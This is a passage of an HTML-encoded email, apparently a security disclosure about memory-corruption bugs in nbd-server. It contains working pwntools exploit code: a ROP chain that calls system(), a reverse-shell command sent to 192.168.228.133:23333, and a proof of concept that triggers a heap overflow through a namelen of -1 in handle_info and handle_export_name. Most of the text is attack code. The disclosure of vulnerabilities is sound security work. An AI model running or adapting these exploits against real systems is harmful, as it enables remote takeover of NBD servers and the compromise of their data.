=3D"color:rgb(224,108,117);font-style:italic">endian</span><span style=3D"c=
olor:rgb(86,182,194)">=3D</span><span style=3D"color:rgb(152,195,121)">&#39=
;little&#39;</span>)<span style=3D"color:rgb(86,182,194)">*</span><span sty=
le=3D"color:rgb(209,154,102)">7</span></div><div><span style=3D"color:rgb(2=
24,108,117)">payload</span> <span style=3D"color:rgb(86,182,194)">+=3D</spa=
n> <span style=3D"color:rgb(97,175,239)">p64</span>(<span style=3D"color:rg=
b(224,108,117)">proc_base</span> <span style=3D"color:rgb(86,182,194)">+</s=
pan> <span style=3D"color:rgb(198,120,221)">0x</span><span style=3D"color:r=
gb(209,154,102)">C2AA</span>, <span style=3D"color:rgb(224,108,117);font-st=
yle:italic">endian</span><span style=3D"color:rgb(86,182,194)">=3D</span><s=
pan style=3D"color:rgb(152,195,121)">&#39;little&#39;</span>)</div><div><sp=
an style=3D"color:rgb(224,108,117)">payload</span> <span style=3D"color:rgb=
(86,182,194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p64</span>(=
<span style=3D"color:rgb(209,154,102)">0</span>, <span style=3D"color:rgb(2=
24,108,117);font-style:italic">endian</span><span style=3D"color:rgb(86,182=
,194)">=3D</span><span style=3D"color:rgb(152,195,121)">&#39;little&#39;</s=
pan>)</div><div><span style=3D"color:rgb(224,108,117)">payload</span> <span=
 style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(97,17=
5,239)">p64</span>(<span style=3D"color:rgb(209,154,102)">1</span>, <span s=
tyle=3D"color:rgb(224,108,117);font-style:italic">endian</span><span style=
=3D"color:rgb(86,182,194)">=3D</span><span style=3D"color:rgb(152,195,121)"=
>&#39;little&#39;</span>)</div><div><span style=3D"color:rgb(224,108,117)">=
payload</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span styl=
e=3D"color:rgb(97,175,239)">p64</span>(<span style=3D"color:rgb(209,154,102=
)">4</span>, <span style=3D"color:rgb(224,108,117);font-style:italic">endia=
n</span><span style=3D"color:rgb(86,182,194)">=3D</span><span style=3D"colo=
r:rgb(152,195,121)">&#39;little&#39;</span>)</div><div><span style=3D"color=
:rgb(224,108,117)">payload</span> <span style=3D"color:rgb(86,182,194)">+=
=3D</span> <span style=3D"color:rgb(97,175,239)">p64</span>(<span style=3D"=
color:rgb(224,108,117)">proc_base</span> <span style=3D"color:rgb(86,182,19=
4)">+</span> <span style=3D"color:rgb(198,120,221)">0x</span><span style=3D=
"color:rgb(209,154,102)">13400</span>, <span style=3D"color:rgb(224,108,117=
);font-style:italic">endian</span><span style=3D"color:rgb(86,182,194)">=3D=
</span><span style=3D"color:rgb(152,195,121)">&#39;little&#39;</span>)</div=
><div><span style=3D"color:rgb(224,108,117)">payload</span> <span style=3D"=
color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p6=
4</span>(<span style=3D"color:rgb(198,120,221)">0x</span><span style=3D"col=
or:rgb(209,154,102)">40</span>, <span style=3D"color:rgb(224,108,117);font-=
style:italic">endian</span><span style=3D"color:rgb(86,182,194)">=3D</span>=
<span style=3D"color:rgb(152,195,121)">&#39;little&#39;</span>)</div><div><=
span style=3D"color:rgb(224,108,117)">payload</span> <span style=3D"color:r=
gb(86,182,194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p64</span=
>(<span style=3D"color:rgb(224,108,117)">proc_base</span> <span style=3D"co=
lor:rgb(86,182,194)">+</span> <span style=3D"color:rgb(224,108,117)">elf</s=
pan>.got[<span style=3D"color:rgb(152,195,121)">&#39;read&#39;</span>], <sp=
an style=3D"color:rgb(224,108,117);font-style:italic">endian</span><span st=
yle=3D"color:rgb(86,182,194)">=3D</span><span style=3D"color:rgb(152,195,12=
1)">&#39;little&#39;</span>)</div><div><span style=3D"color:rgb(224,108,117=
)">payload</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span s=
tyle=3D"color:rgb(97,175,239)">p64</span>(<span style=3D"color:rgb(224,108,=
117)">proc_base</span> <span style=3D"color:rgb(86,182,194)">+</span> <span=
 style=3D"color:rgb(198,120,221)">0x</span><span style=3D"color:rgb(209,154=
,102)">C290</span>, <span style=3D"color:rgb(224,108,117);font-style:italic=
">endian</span><span style=3D"color:rgb(86,182,194)">=3D</span><span style=
=3D"color:rgb(152,195,121)">&#39;little&#39;</span>)</div><div><span style=
=3D"color:rgb(224,108,117)">payload</span> <span style=3D"color:rgb(86,182,=
194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p64</span>(<span st=
yle=3D"color:rgb(209,154,102)">0</span>)<span style=3D"color:rgb(86,182,194=
)">*</span><span style=3D"color:rgb(209,154,102)">7</span></div><div><span =
style=3D"color:rgb(224,108,117)">payload</span> <span style=3D"color:rgb(86=
,182,194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p64</span>(<sp=
an style=3D"color:rgb(224,108,117)">proc_base</span> <span style=3D"color:r=
gb(86,182,194)">+</span> <span style=3D"color:rgb(198,120,221)">0x</span><s=
pan style=3D"color:rgb(209,154,102)">4a58</span>, <span style=3D"color:rgb(=
224,108,117);font-style:italic">endian</span><span style=3D"color:rgb(86,18=
2,194)">=3D</span><span style=3D"color:rgb(152,195,121)">&#39;little&#39;</=
span>)</div><div><span style=3D"color:rgb(224,108,117)">payload</span> <spa=
n style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(97,1=
75,239)">p64</span>(<span style=3D"color:rgb(224,108,117)">proc_base</span>=
 <span style=3D"color:rgb(86,182,194)">+</span> <span style=3D"color:rgb(19=
8,120,221)">0x</span><span style=3D"color:rgb(209,154,102)">13400</span>, <=
span style=3D"color:rgb(224,108,117);font-style:italic">endian</span><span =
style=3D"color:rgb(86,182,194)">=3D</span><span style=3D"color:rgb(152,195,=
121)">&#39;little&#39;</span>)</div><div><span style=3D"color:rgb(224,108,1=
17)">payload</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span=
 style=3D"color:rgb(97,175,239)">p64</span>(<span style=3D"color:rgb(224,10=
8,117)">proc_base</span> <span style=3D"color:rgb(86,182,194)">+</span> <sp=
an style=3D"color:rgb(224,108,117)">elf</span>.plt[<span style=3D"color:rgb=
(152,195,121)">&#39;system&#39;</span>] , <span style=3D"color:rgb(224,108,=
117);font-style:italic">endian</span><span style=3D"color:rgb(86,182,194)">=
=3D</span><span style=3D"color:rgb(152,195,121)">&#39;little&#39;</span>)</=
div><div><span style=3D"color:rgb(97,175,239)">nbd_opt_info</span>(<span st=
yle=3D"color:rgb(224,108,117)">payload</span>, <span style=3D"color:rgb(198=
,120,221)">b</span><span style=3D"color:rgb(152,195,121)">&quot;B&quot;</sp=
an><span style=3D"color:rgb(86,182,194)">*</span><span style=3D"color:rgb(2=
09,154,102)">4096</span>)</div><br><div><span style=3D"color:rgb(224,108,11=
7)">p</span>.<span style=3D"color:rgb(97,175,239)">send</span>(<span style=
=3D"color:rgb(198,120,221)">b</span><span style=3D"color:rgb(152,195,121)">=
&quot;bash -c &#39;sh -i &gt;&amp; /dev/tcp/<a href=3D"http://192.168.228.1=
33/23333">192.168.228.133/23333</a> 0&gt;&amp;1&#39;&quot;</span>)</div><br=
><div><span style=3D"color:rgb(97,175,239)">print</span>(<span style=3D"col=
or:rgb(229,192,123)">time</span>.<span style=3D"color:rgb(97,175,239)">perf=
_counter</span>() <span style=3D"color:rgb(86,182,194)">-</span> <span styl=
e=3D"color:rgb(224,108,117)">t0</span>)</div><div><span style=3D"color:rgb(=
224,108,117)">p</span>.<span style=3D"color:rgb(97,175,239)">interactive</s=
pan>()</div><br></div></div><div><br></div><div>2.heap overflow</div><div>I=
n nbd-server.c, function handle_info and=C2=A0handle_export_name have a hea=
p=C2=A0overflow<br></div><div><br></div><div><a href=3D"https://github.com/=
NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-se=
rver.c#L2302">https://github.com/NetworkBlockDevice/nbd/blob/5750003711b805=
0bad3ddaf5196201ef419ce15d/nbd-server.c#L2302</a><br></div><div><a href=3D"=
https://github.com/NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf51962=
01ef419ce15d/nbd-server.c#L2117">https://github.com/NetworkBlockDevice/nbd/=
blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-server.c#L2117</a><br></d=
iv><div><br></div><div><div>namelen can be controlled by an attacker,=C2=A0=
 when `namelen =3D -1`,=C2=A0 malloc will allocate a very small buffer, but=
 socket_read will read a 0xffffffff, thus causing a heap overflow</div></di=
v><div><br></div><div><div style=3D"background-color:rgb(40,44,52);font-fam=
ily:Consolas,&quot;Courier New&quot;,monospace;font-size:14px;line-height:1=
9px;white-space:pre"><div style=3D"color:rgb(171,178,191)"><div><span style=
=3D"color:rgb(198,120,221);font-style:italic">from</span> pwn <span style=
=3D"color:rgb(198,120,221);font-style:italic">import</span> <span style=3D"=
color:rgb(86,182,194)">*</span></div><div><span style=3D"color:rgb(86,182,1=
94)"><br></span></div><div>context.endian <span style=3D"color:rgb(86,182,1=
94)">=3D</span> <span style=3D"color:rgb(152,195,121)">&quot;big&quot;</spa=
n></div><div>context.log_level <span style=3D"color:rgb(86,182,194)">=3D</s=
pan> <span style=3D"color:rgb(152,195,121)">&quot;debug&quot;</span></div><=
font color=3D"#abb2bf"><br></font><div><span style=3D"color:rgb(224,108,117=
)">elf</span> <span style=3D"color:rgb(86,182,194)">=3D</span> <span style=
=3D"color:rgb(97,175,239)">ELF</span>(<span style=3D"color:rgb(152,195,121)=
">&quot;./nbd-server&quot;</span>)</div><font color=3D"#abb2bf"><br></font>=
<div><span style=3D"color:rgb(229,192,123)">NBD_OPT</span> <span style=3D"c=
olor:rgb(86,182,194)">=3D</span> {</div><div>=C2=A0 =C2=A0 <span style=3D"c=
olor:rgb(152,195,121)">&quot;NBD_OPT_EXPORT_NAME&quot;</span>:<span style=
=3D"color:rgb(209,154,102)">1</span>,</div><div>=C2=A0 =C2=A0 <span style=
=3D"color:rgb(152,195,121)">&quot;NBD_OPT_ABORT&quot;</span>:<span style=3D=
"color:rgb(209,154,102)">2</span>,</div><div>=C2=A0 =C2=A0 <span style=3D"c=
olor:rgb(152,195,121)">&quot;NBD_OPT_LIST&quot;</span>:<span style=3D"color=
:rgb(209,154,102)">3</span>,</div><div>=C2=A0 =C2=A0 <span style=3D"color:r=
gb(152,195,121)">&quot;NBD_OPT_STARTTLS&quot;</span>:<span style=3D"color:r=
gb(209,154,102)">5</span>,</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb=
(152,195,121)">&quot;NBD_OPT_INFO&quot;</span>:<span style=3D"color:rgb(209=
,154,102)">6</span>,</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(152,1=
95,121)">&quot;NBD_OPT_GO&quot;</span>:<span style=3D"color:rgb(209,154,102=
)">7</span>,</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(152,195,121)"=
>&quot;NBD_OPT_STRUCTURED_REPLY&quot;</span>:<span style=3D"color:rgb(209,1=
54,102)">8</span>,</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(152,195=
,121)">&quot;NBD_OPT_LIST_META_CONTEXT&quot;</span>:<span style=3D"color:rg=
b(209,154,102)">9</span>,</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(=
152,195,121)">&quot;NBD_OPT_SET_META_CONTEXT&quot;</span>:<span style=3D"co=
lor:rgb(209,154,102)">10</span></div><div>}</div><font color=3D"#abb2bf"><b=
r></font><div><span style=3D"color:rgb(229,192,123)">NBD_NEW_VERSION</span>=
 <span style=3D"color:rgb(86,182,194)">=3D</span> <span style=3D"color:rgb(=
198,120,221)">b</span><span style=3D"color:rgb(152,195,121)">&quot;IHAVEOPT=
&quot;</span></div><font color=3D"#abb2bf"><br></font><div><span style=3D"c=
olor:rgb(198,120,221)">def</span> <span style=3D"color:rgb(97,175,239)">nbd=
_opt_info</span>(<span style=3D"color:rgb(224,108,117);font-style:italic">b=
uf</span>, <span style=3D"color:rgb(224,108,117);font-style:italic">name</s=
pan>):</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">optio=
n</span> <span style=3D"color:rgb(86,182,194)">=3D</span> <span style=3D"co=
lor:rgb(198,120,221)">b</span><span style=3D"color:rgb(152,195,121)">&quot;=
&quot;</span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)=
">option</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span sty=
le=3D"color:rgb(229,192,123)">NBD_NEW_VERSION</span></div><div>=C2=A0 =C2=
=A0 <span style=3D"color:rgb(224,108,117)">option</span> <span style=3D"col=
or:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p32</=
span>(<span style=3D"color:rgb(229,192,123)">NBD_OPT</span>[<span style=3D"=
color:rgb(152,195,121)">&quot;NBD_OPT_INFO&quot;</span>])</div><div>=C2=A0 =
=C2=A0 <span style=3D"color:rgb(224,108,117)">option</span> <span style=3D"=
color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p3=
2</span>(<span style=3D"color:rgb(97,175,239)">len</span>(<span style=3D"co=
lor:rgb(224,108,117);font-style:italic">buf</span>) <span style=3D"color:rg=
b(86,182,194)">+</span> <span style=3D"color:rgb(209,154,102)">4</span>)</d=
iv><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">option</span> =
<span style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(=
97,175,239)">p32</span>(<span style=3D"color:rgb(97,175,239)">len</span>(<s=
pan style=3D"color:rgb(224,108,117);font-style:italic">name</span>))</div><=
div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">option</span> <spa=
n style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(224,=
108,117);font-style:italic">buf</span></div><div>=C2=A0 =C2=A0 <span style=
=3D"color:rgb(224,108,117)">option</span> <span style=3D"color:rgb(86,182,1=
94)">+=3D</span> <span style=3D"color:rgb(224,108,117);font-style:italic">n=
ame</span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">o=
ption</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span style=
=3D"color:rgb(97,175,239)">p16</span>(<span style=3D"color:rgb(209,154,102)=
">0</span>)</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">=
p</span>.<span style=3D"color:rgb(97,175,239)">send</span>(<span style=3D"c=
olor:rgb(224,108,117)">option</span>)</div><font color=3D"#abb2bf"><br></fo=
nt><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(198,120,221);font-style:ital=
ic">return</span></div><font color=3D"#abb2bf"><br></font><div><span style=
=3D"color:rgb(198,120,221);font-style:italic">if</span> <span style=3D"colo=
r:rgb(97,175,239)">len</span>(<span style=3D"color:rgb(229,192,123)">sys</s=
pan>.<span style=3D"color:rgb(224,108,117)">argv</span>) <span style=3D"col=
or:rgb(86,182,194)">&lt;</span> <span style=3D"color:rgb(209,154,102)">3</s=
pan>:</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(97,175,239)">print</=
span>(<span style=3D"color:rgb(152,195,121)">&quot;usage: nbdtest.py ip por=
t&quot;</span>)</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(97,175,239=
)">exit</span>(<span style=3D"color:rgb(209,154,102)">0</span>)</div><font =
color=3D"#abb2bf"><br></font><div><span style=3D"color:rgb(224,108,117)">ip=
</span> <span style=3D"color:rgb(86,182,194)">=3D</span> <span style=3D"col=
or:rgb(229,192,123)">sys</span>.<span style=3D"color:rgb(224,108,117)">argv=
</span>[<span style=3D"color:rgb(209,154,102)">1</span>]</div><div><span st=
yle=3D"color:rgb(224,108,117)">port</span> <span style=3D"color:rgb(86,182,=
194)">=3D</span> <span style=3D"color:rgb(229,192,123)">int</span>(<span st=
yle=3D"color:rgb(229,192,123)">sys</span>.<span style=3D"color:rgb(224,108,=
117)">argv</span>[<span style=3D"color:rgb(209,154,102)">2</span>])</div><d=
iv><span style=3D"color:rgb(224,108,117)">p</span> <span style=3D"color:rgb=
(86,182,194)">=3D</span> <span style=3D"color:rgb(97,175,239)">remote</span=
>(<span style=3D"color:rgb(224,108,117)">ip</span>, <span style=3D"color:rg=
b(224,108,117)">port</span>)</div><font color=3D"#abb2bf"><br></font><div><=
span style=3D"color:rgb(224,108,117)">p</span>.<span style=3D"color:rgb(97,=
175,239)">recvuntil</span>(<span style=3D"color:rgb(198,120,221)">b</span><=
span style=3D"color:rgb(152,195,121)">&quot;NBDMAGICIHAVEOPT&quot;</span>)<=
/div><div><span style=3D"color:rgb(224,108,117)">gflag</span> <span style=
=3D"color:rgb(86,182,194)">=3D</span> <span style=3D"color:rgb(97,175,239)"=
>u16</span>(<span style=3D"color:rgb(224,108,117)">p</span>.<span style=3D"=
color:rgb(97,175,239)">recv</span>())</div><div><span style=3D"color:rgb(22=
4,108,117)">p</span>.<span style=3D"color:rgb(97,175,239)">send</span>(<spa=
n style=3D"color:rgb(97,175,239)">p32</span>(<span style=3D"color:rgb(224,1=
08,117)">gflag</span>))</div><div><br></div><div><div><span style=3D"color:=
rgb(224,108,117)">option</span> <span style=3D"color:rgb(86,182,194)">=3D</=
span> <span style=3D"color:rgb(198,120,221)">b</span><span style=3D"color:r=
gb(152,195,121)">&quot;&quot;</span></div><div><span style=3D"color:rgb(224=
,108,117)">option</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> =
<span style=3D"color:rgb(229,192,123)">NBD_NEW_VERSION</span></div><div><sp=
an style=3D"color:rgb(224,108,117)">option</span> <span style=3D"color:rgb(=
86,182,194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p32</span>(<=
span style=3D"color:rgb(229,192,123)">NBD_OPT</span>[<span style=3D"color:r=
gb(152,195,121)">&quot;NBD_OPT_INFO&quot;</span>])</div><div><span style=3D=
"color:rgb(224,108,117)">option</span> <span style=3D"color:rgb(86,182,194)=
">+=3D</span> <span style=3D"color:rgb(97,175,239)">p32</span>(<font color=
=3D"#61afef">1024</font><font color=3D"#abb2bf">)</font></div><div><span st=
yle=3D"color:rgb(224,108,117)">option</span><font color=3D"#abb2bf"> </font=
><span style=3D"color:rgb(86,182,194)">+=3D</span><font color=3D"#abb2bf"> =
</font><span style=3D"color:rgb(97,175,239)">p32</span><font color=3D"#abb2=
bf">(</font><font color=3D"#61afef">-1</font><font color=3D"#abb2bf">)</fon=
t></div><div><span style=3D"color:rgb(224,108,117)">option</span> <span sty=
le=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(198,120,2=
21)">b</span><span style=3D"color:rgb(224,108,117);font-style:italic">&quot=
;A&quot;*1024</span></div><div><span style=3D"color:rgb(224,108,117)">optio=
n</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"c=
olor:rgb(198,120,221)">b</span><span style=3D"color:rgb(224,108,117);font-s=
tyle:italic">&quot;B&quot;*4096</span></div><div><span style=3D"color:rgb(2=
24,108,117)">option</span> <span style=3D"color:rgb(86,182,194)">+=3D</span=
> <span style=3D"color:rgb(97,175,239)">p16</span>(<span style=3D"color:rgb=
(209,154,102)">0</span>)</div><div><span style=3D"color:rgb(224,108,117)">p=
</span>.<span style=3D"color:rgb(97,175,239)">send</span>(<span style=3D"co=
lor:rgb(224,108,117)">option</span>)</div></div></div></div></div><div><br>=
</div><div>Wangduo of=C2=A0<span style=3D"color:rgb(23,26,29);font-family:&=
quot;Microsoft YaHei&quot;,&quot;Segoe UI&quot;,system-ui,Roboto,&quot;Droi=
d Sans&quot;,&quot;Helvetica Neue&quot;,sans-serif,Tahoma,&quot;Segoe UI Sy=
mbolMyanmar Text&quot;,=E5=BE=AE=E8=BD=AF=E9=9B=85=E9=BB=91;font-size:14px;=
white-space:pre-wrap">Chaitin Security Research Lab</span></div><div><span =
style=3D"font-family:Consolas,&quot;Courier New&quot;,monospace;font-size:1=
4px;white-space:pre;background-color:rgb(40,44,52);color:rgb(86,182,194)"><=
br></span></div><div><span style=3D"font-family:Consolas,&quot;Courier New&=
quot;,monospace;font-size:14px;white-space:pre;background-color:rgb(40,44,5=
2);color:rgb(86,182,194)"><br></span></div><div><br></div><div><br></div><d=
iv><br></div><div><br></div><div><div class=3D"gmail-msg-operation" style=
=3D"box-sizing:border-box;background-clip:padding-box;margin:0px;padding:0p=
x 4px;display:flex;color:rgb(23,26,29);font-family:&quot;Microsoft YaHei&qu=
ot;,&quot;Segoe UI&quot;,system-ui,Roboto,&quot;Droid Sans&quot;,&quot;Helv=
etica Neue&quot;,sans-serif,Tahoma,&quot;Segoe UI SymbolMyanmar Text&quot;,=
=E5=BE=AE=E8=BD=AF=E9=9B=85=E9=BB=91;font-size:14px;background-color:rgb(24=
1,242,243)"></div></div></div></div></div></div></div></div></div></div></d=
iv></div></div></div></div></div></div></div></div></div></div></div></div>=
</div></div></div></div></div></div></div>

--0000000000007a020205d64c2551--

